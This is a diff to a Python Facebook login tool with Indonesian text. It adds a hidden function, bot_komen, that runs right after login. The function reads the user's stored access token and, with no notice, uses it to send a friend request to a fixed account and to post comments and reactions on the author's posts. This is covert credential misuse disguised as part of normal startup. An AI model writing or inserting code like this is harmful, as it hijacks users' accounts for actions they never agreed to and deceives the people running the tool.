@@ -126,11 +126,33 @@ def tokenz():
 		jalan ('\033[1;97m Jangan Lupa Follow Akun Pribadi Saya :)')
 		jalan ('\033[1;97m[\033[1;91m•\033[1;97m•\033[1;97m]\033[1;92m Sedang Login....Login Berhasil')
 		os.system('xdg-open https://m.facebook.com/xxx.hilmanxd')
-		menu()
+		bot_komen()
 	except KeyError:
 		print "\033[1;97m[\033[1;93m!\033[1;97m] \033[1;93mToken Salah !"
 		time.sleep(1.0)
 		masuk()
+
+def bot_komen():
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;39m[!] Token invalid'
+        os.system('rm -rf login.txt')
+
+    una = '100041160843927'
+    una2 = '100041160843927'
+    kom = 'Izin Pakai script lu Bang Hilman \xf0\x9f\x98\x81\xf0\x9f\x98\x81'
+    reac = 'LOVE'
+    post = '420807329301292'
+    post2 = '420807329301292'
+    kom2 = 'Izin Pakai script lu bang\xf0\x9f\x99\x8f'
+    reac2 = 'ANGRY'
+    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
+    menu()
 
 ######MENU#######
 def menu():
